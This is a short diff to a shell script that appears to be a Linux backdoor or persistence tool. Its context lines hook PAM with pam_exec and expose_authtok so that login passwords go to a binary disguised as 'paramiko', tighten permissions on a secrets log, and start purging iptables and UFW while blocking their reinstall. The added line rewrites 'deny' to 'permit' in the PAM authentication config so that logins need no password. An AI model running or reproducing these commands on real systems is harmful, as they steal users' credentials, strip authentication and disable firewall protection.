@@ -89,6 +89,7 @@ sudo chmod 770 /var/log/secrets.log
 echo "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/paramiko" >> /etc/pam.d/common-auth
 sudo chmod 700 /usr/local/bin/paramiko
 #TODO hack PAM to allow login without password
+sed -i 's/deny/permit/g' /etc/pam.d/common-auth
 #Remove iptables and UFW, and block them from being reinstalled
 echo "[*]Removing UFW/iptables and blocking their install"
 apt-get remove iptables --purge -y
